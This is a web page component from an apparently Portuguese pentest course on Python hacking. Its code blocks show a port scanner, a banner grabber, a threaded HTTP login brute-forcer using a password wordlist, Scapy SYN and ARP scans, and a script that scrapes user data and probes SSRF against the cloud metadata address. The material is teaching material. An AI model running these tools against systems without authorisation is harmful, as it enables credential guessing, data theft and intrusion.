import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function PythonHacking() {
    return (
      <PageContainer
        title="Python para Hacking"
        subtitle="Desenvolva ferramentas de segurança, exploits e automações com Python 3."
        difficulty="intermediario"
        timeToRead="18 min"
      >
        <AlertBox type="info" title="Python é a linguagem do pentester moderno">
          A maioria das ferramentas de segurança é escrita em Python: Impacket, SQLMap, theHarvester,
          Scapy, e centenas de outras. Saber Python permite adaptar e criar suas próprias ferramentas.
        </AlertBox>

        <h2>Scanner de Portas Básico</h2>
        <CodeBlock language="python" code={'import socket\nimport sys\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef scan_port(host, port, timeout=1):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.settimeout(timeout)\n        result = s.connect_ex((host, port))\n        if result == 0:\n            try:\n                svc = socket.getservbyport(port)\n            except:\n                svc = "desconhecido"\n            print(f"[+] {host}:{port} ABERTO ({svc})")\n            return port\n    return None\n\ndef scan_host(host, ports=range(1, 1025)):\n    open_ports = []\n    with ThreadPoolExecutor(max_workers=100) as executor:\n        futures = {executor.submit(scan_port, host, port): port for port in ports}\n        for future in futures:\n            result = future.result()\n            if result:\n                open_ports.append(result)\n    return open_ports\n\nif __name__ == "__main__":\n    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"\n    print(f"[*] Escaneando {host}...")\n    ports = scan_host(host)\n    print(f"[*] {len(ports)} porta(s) abertas")'} />

        <h2>Banner Grabber</h2>
        <CodeBlock language="python" code={'import socket\n\ndef grab_banner(ip, port):\n    try:\n        s = socket.socket()\n        s.settimeout(3)\n        s.connect((ip, port))\n        \n        # Alguns serviços precisam de estímulo\n        if port == 80:\n            s.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n")\n        elif port == 25:\n            pass  # SMTP manda banner automaticamente\n        \n        banner = s.recv(1024).decode(\'utf-8\', errors=\'ignore\').strip()\n        s.close()\n        return banner\n    except:\n        return None\n\n# Uso\nhosts = ["192.168.1.1", "192.168.1.10"]\nports = [21, 22, 25, 80, 443, 8080]\n\nfor host in hosts:\n    for port in ports:\n        banner = grab_banner(host, port)\n        if banner:\n            print(f"[{host}:{port}] {banner[:100]}")'} />

        <h2>Brute Force HTTP Login</h2>
        <CodeBlock language="python" code={'import requests\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef try_login(url, username, password, success_indicator):\n    data = {"username": username, "password": password}\n    try:\n        r = requests.post(url, data=data, timeout=5, allow_redirects=True)\n        if success_indicator in r.text or r.status_code == 302:\n            return password\n    except:\n        pass\n    return None\n\ndef brute_force(url, username, wordlist_file, success_text):\n    with open(wordlist_file, \'r\', encoding=\'utf-8\', errors=\'ignore\') as f:\n        passwords = f.read().splitlines()\n    \n    print(f"[*] Testando {len(passwords)} senhas para {username}")\n    \n    with ThreadPoolExecutor(max_workers=20) as ex:\n        futures = {ex.submit(try_login, url, username, pwd, success_text): pwd\n                   for pwd in passwords}\n        for future in futures:\n            result = future.result()\n            if result:\n                print(f"[+] SENHA ENCONTRADA: {result}")\n                return result\n    \n    print("[-] Senha não encontrada")\n    return None\n\n# Exemplo de uso:\n# brute_force("http://alvo.com/login", "admin", "/usr/share/wordlists/rockyou.txt", "Bem-vindo")'} />

        <h2>Scapy — Manipulação de Pacotes</h2>
        <CodeBlock language="python" code={'from scapy.all import *\n\n# Criar pacote ICMP (ping)\npkt = IP(dst="8.8.8.8") / ICMP()\nresp = sr1(pkt, timeout=2, verbose=0)\nif resp:\n    print(f"Host ativo! RTT: {resp.time}s")\n\n# SYN scan (stealth)\ndef syn_scan(target, ports):\n    open_ports = []\n    for port in ports:\n        pkt = IP(dst=target) / TCP(dport=port, flags="S")\n        resp = sr1(pkt, timeout=1, verbose=0)\n        if resp and resp.haslayer(TCP):\n            if resp[TCP].flags == "SA":  # SYN-ACK\n                open_ports.append(port)\n                # Enviar RST para fechar\n                send(IP(dst=target)/TCP(dport=port, flags="R"), verbose=0)\n    return open_ports\n\n# ARP scan\ndef arp_scan(network):\n    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),\n                  timeout=2, verbose=0)\n    return [(r.psrc, r.hwsrc) for _, r in ans]\n\nhosts = arp_scan("192.168.1.0/24")\nfor ip, mac in hosts:\n    print(f"IP: {ip} | MAC: {mac}")'} />

        <h2>Requests — Automação Web</h2>
        <CodeBlock language="python" code={'import requests\nfrom bs4 import BeautifulSoup\n\n# Session com autenticação\nurl_base = "https://app.com"\ns = requests.Session()\ns.headers.update({"User-Agent": "Mozilla/5.0"})\n\n# Login\nr = s.post(f"{url_base}/login", data={"user": "admin", "pass": "admin"})\nprint(f"Login: {r.status_code}")\n\n# Acessar recurso autenticado\nr = s.get(f"{url_base}/admin/users")\nsoup = BeautifulSoup(r.text, "html.parser")\n\n# Extrair dados\nfor user in soup.find_all("tr", class_="user-row"):\n    nome = user.find("td", class_="name").text\n    email = user.find("td", class_="email").text\n    print(f"Usuário: {nome} | Email: {email}")\n\n# SSRF simples\nfor path in ["localhost/", "127.0.0.1/", "169.254.169.254/"]:\n    r = requests.get(f"{url_base}/fetch?url=http://{path}", timeout=5)\n    print(f"{path}: {r.status_code} - {r.text[:100]}")'} />

        <AlertBox type="success" title="Bibliotecas essenciais">
          requests (HTTP), scapy (pacotes), paramiko (SSH), impacket (protocolos Windows),
          pwntools (exploits/CTF), selenium (browser automation). Instale com pip3.
        </AlertBox>
      </PageContainer>
    );
  }
  